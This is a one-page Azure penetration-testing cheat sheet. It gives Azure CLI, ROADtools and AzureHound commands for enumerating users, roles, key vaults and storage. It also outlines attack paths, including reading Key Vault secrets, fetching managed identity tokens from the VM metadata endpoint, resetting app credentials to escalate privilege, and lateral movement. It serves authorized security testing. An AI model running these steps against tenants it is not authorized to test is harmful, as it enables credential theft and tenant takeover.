# Azure Pentest - Quick Reference Card

**One-page cheat sheet for active engagements**

---

## ğŸ¯ Skills Quick Reference

| Command | Purpose | When to Use |
|---------|---------|-------------|
| `/azure-pentest-init` | Start project or check progress | New engagement OR need guidance |
| `/azure-enum` | Get enumeration commands | Need specific Azure CLI commands |
| `/azure-findings` | Analyze outputs | Have raw command output to parse |
| `/roadtools-helper` | ROADtools guidance | Using ROADrecon/GUI |
| `/azurehound-helper` | AzureHound & BloodHound | Mapping attack paths |
| `/prowler-azure` | CIS compliance, 169+ checks | Azure infrastructure audit |
| `/scoutsuite-azure` | Quick config audit | Visual HTML dashboard |
| `/Monkey365` | M365 security review | Exchange/SharePoint/Teams focus |
| `/Maester` | Entra ID security tests | 280+ tests, MITRE mapping |

---

## âš¡ Essential Commands

### Authentication
```bash
az login -u user@domain.com -p 'password'
az account show                          # Verify login
az role assignment list --assignee user@domain.com -o table
```

### Quick Wins
```bash
# Automated enumeration
cd Scripts && ./enum.sh && ./quick-checks.sh

# Your permissions
az role assignment list --assignee USER -o table

# Key vaults (try to access secrets!)
az keyvault list -o table
az keyvault secret list --vault-name VAULT -o table

# Storage accounts (check for public access)
az storage account list --query "[].{name:name, publicAccess:allowBlobPublicAccess}" -o table

# Service principals with credentials
az ad sp list --all --query "[?passwordCredentials!=null].{name:displayName, appId:appId}" -o table
```

### High-Value Enumeration
```bash
# Users
az ad user list -o table
az ad user list --query "[?contains(displayName, 'admin')]" -o table

# Groups
az ad group list -o table
az ad group member list --group "GROUPNAME" -o table

# VMs
az vm list -o table
az vm list-ip-addresses -o table

# Role assignments (find Owners/Contributors)
az role assignment list --role "Owner" -o table
az role assignment list --role "Contributor" -o table
```

---

## ğŸ”¥ Common Attack Paths

### 1. Key Vault â†’ Credentials
```bash
az keyvault list -o table
az keyvault secret list --vault-name VAULT -o table
az keyvault secret show --vault-name VAULT --name SECRET | jq -r .value
```

### 2. Storage Account â†’ Data Access
```bash
az storage account list -o table
az storage container list --account-name STORAGE --auth-mode login
az storage blob list --account-name STORAGE --container-name CONTAINER --auth-mode login
```

### 3. VM â†’ Managed Identity Token
```bash
# If you can execute commands on VM:
# Inside VM:
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 4. App Registration â†’ Privilege Escalation
```bash
# If you have Application Administrator role:
az ad app list --query "[?displayName=='TargetApp']" -o table
az ad app credential reset --id APP_ID
# Use returned credentials with high permissions
```

---

## ğŸ› ï¸ ROADtools Quick Commands

```bash
# Collect
roadrecon auth -u user@domain.com -p 'password'
roadrecon gather | tee outputs/roadrecon.log

# Analyze
roadrecon gui  # http://127.0.0.1:5000

# Query database
sqlite3 roadrecon.db "SELECT displayName, userPrincipalName FROM Users u JOIN RoleMembers rm ON u.objectId = rm.memberId JOIN Roles r ON rm.roleId = r.objectId WHERE r.displayName = 'Global Administrator';"
```

---

## ğŸ¯ AzureHound Quick Commands

```bash
# Collect
./azurehound -u "user@domain.com" -p "password" list --tenant "domain.onmicrosoft.com" -o outputs/az.json

# Start Neo4j
docker run -d --name neo4j -p 7474:7474 -p 7687:7687 -e NEO4J_AUTH=neo4j/bloodhound123 neo4j:4.4

# BloodHound - Key Queries
# 1. Mark user as owned (search for your user, right-click)
# 2. Analysis â†’ "Shortest Paths to High Value Targets"

# Custom query - Your direct permissions
MATCH (u:AZUser {name:"USER@DOMAIN.COM"})-[r]->(target)
RETURN type(r), target.name, labels(target)

# Find paths to Global Admin
MATCH p=shortestPath((u:AZUser {name:"USER@DOMAIN.COM"})-[*1..]->(role:AZRole))
WHERE role.name =~ "(?i).*GLOBAL ADMINISTRATOR.*"
RETURN p
```

---

## ğŸ“Š Finding Severity Quick Guide

| Severity | Examples |
|----------|----------|
| **Critical** | Global Admin compromised, SQL open to 0.0.0.0/0, Public storage with sensitive data |
| **High** | Contributor on subscription, Key vault accessible, Dangerous app permissions |
| **Medium** | No MFA, HTTP allowed on storage, TLS < 1.2 |
| **Low** | No soft delete, Missing tags, Hygiene issues |

---

## ğŸ” Output Analysis Workflow

```bash
# 1. Run enumeration
./enum.sh

# 2. Check outputs
ls -lh outputs/enum_*/

# 3. Analyze with skill
/azure-findings
[paste interesting output]

# 4. Document in Findings.md
# Use formatted output from azure-findings skill

# 5. Follow up with targeted enumeration
/azure-enum
"enumerate containers in storage account X"
```

---

## ğŸ’¾ Save Outputs Pattern

```bash
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Example saves
az ad user list > outputs/users_${TIMESTAMP}.json
az keyvault list > outputs/keyvaults_${TIMESTAMP}.json
az vm list > outputs/vms_${TIMESTAMP}.json
az role assignment list > outputs/roles_${TIMESTAMP}.json
```

---

## ğŸš¨ Troubleshooting Quick Fixes

| Problem | Solution |
|---------|----------|
| MFA blocking | `az login --use-device-code` |
| Session expired | `az login` (re-authenticate) |
| Permission denied | `az role assignment list --assignee USER` (check your roles) |
| Script fails | Check `outputs/*/auth.log` for errors |
| ROADtools incomplete | Normal if you don't have read-all permissions |

---

## ğŸ“ Daily Workflow

### Morning
1. `az login` (re-authenticate if needed)
2. `/azure-pentest-init` (check progress and plan)
3. Review yesterday's findings in Notes.md

### During Testing
1. Run commands from Commands.md
2. Use `/azure-enum` for specific tasks
3. Paste outputs to `/azure-findings` for analysis
4. Document everything in Notes.md â†’ Quick Notes

### End of Day
1. Update Findings.md with confirmed findings
2. Update Notes.md with session summary
3. Commit findings to Follow-Up Items
4. Plan tomorrow's focus

---

## ğŸ¯ Priority Enumeration Checklist

- [ ] Your role assignments (`az role assignment list --assignee YOU`)
- [ ] Key vaults (`az keyvault list` â†’ try to list secrets)
- [ ] Storage accounts (`az storage account list` â†’ check public access)
- [ ] Users with admin roles (`az ad user list` â†’ filter for admins)
- [ ] Service principals with credentials (`az ad sp list`)
- [ ] VMs with public IPs (`az vm list-ip-addresses`)
- [ ] Network security groups (`az network nsg list` â†’ check rules)
- [ ] Resource groups (`az group list` â†’ understand structure)

---

## ğŸ”‘ Key Vault Quick Exploit

```bash
# 1. List vaults
az keyvault list -o table

# 2. Try to list secrets (permission check)
az keyvault secret list --vault-name VAULT_NAME -o table

# 3. If successful, get secret values
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME | jq -r .value

# 4. Document as HIGH finding
# 5. Use extracted credentials for lateral movement
```

---

## ğŸ”’ Compliance Scanning Quick Commands

```bash
# Prowler - Azure CIS Benchmark
prowler azure --compliance cis_azure_2.0 \
    --output-formats json html \
    --output-directory outputs/prowler_$(date +%Y%m%d_%H%M%S)

# ScoutSuite - Quick Config Audit
scout azure --cli

# Monkey365 - M365 Security (PowerShell)
Invoke-Monkey365 -Instance Microsoft365 -Analysis All -ExportTo HTML,JSON

# Maester - Entra ID Tests (PowerShell)
Connect-Maester
Invoke-Maester -OutputHtmlPath "./maester-report.html"
```

---

## ğŸ“¦ Tool Installation Quick Reference

```bash
# Azure CLI
brew install azure-cli

# jq
brew install jq

# ROADtools
pip3 install roadrecon

# AzureHound
# Download from GitHub releases

# Neo4j (Docker)
docker pull neo4j:4.4

# BloodHound
# Download from GitHub releases

# Prowler
pip install prowler

# ScoutSuite
pip install scoutsuite

# Monkey365 (PowerShell)
Install-Module -Name monkey365 -Scope CurrentUser

# Maester (PowerShell)
Install-Module Pester -Force
Install-Module Maester -Scope CurrentUser
```

---

## ğŸ’¡ Pro Tips

1. **Always run enum.sh first** - Get the full picture
2. **Use skills for analysis** - Don't manually parse JSON
3. **Save everything** - All commands to outputs/ with timestamps
4. **Document in real-time** - Notes.md â†’ Quick Notes section
5. **Validate paths** - Confirm with Azure CLI before exploiting
6. **Check permissions early** - Know what you can/can't do
7. **Follow the easy path** - Quick wins â†’ Complex attacks
8. **Update progress** - `/azure-pentest-init` to stay on track

---

## ğŸš€ New Engagement - 60 Second Start

```bash
# 1. Initialize (30 sec)
cd ~/engagements/ClientName
/azure-pentest-init
# Answer prompts

# 2. Authenticate (15 sec)
az login -u user@tenant.com -p 'password'

# 3. Start enum (15 sec to launch)
cd Scripts && ./enum.sh
# Wait 20-30 min for completion

# Done! Review outputs/ when ready
```

---

**Print this page and keep it handy during engagements! ğŸ¯**
